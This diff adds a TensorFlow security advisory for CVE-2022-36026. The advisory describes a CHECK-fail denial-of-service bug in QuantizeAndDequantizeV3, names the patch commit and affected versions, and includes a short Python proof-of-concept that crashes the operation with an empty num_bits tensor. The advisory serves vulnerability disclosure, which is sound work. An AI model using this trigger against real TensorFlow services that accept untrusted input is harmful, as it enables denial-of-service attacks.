@@ -1,0 +1,24 @@
+<h2>TFSA-2022-112: <code>CHECK</code> fail in <code>QuantizeAndDequantizeV3</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-36026</p>
+<h3>Impact</h3>
+<p>If <code>QuantizeAndDequantizeV3</code> is given a nonscalar <code>num_bits</code> input tensor, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>signed_input = True
+range_given = False
+narrow_range = False
+axis = -1
+input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
+input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
+input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
+num_bits = tf.constant([], shape=[0], dtype=tf.int32)
+tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713">f3f9cb38ecfe5a8a703f2c4a8fead434ef291713</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
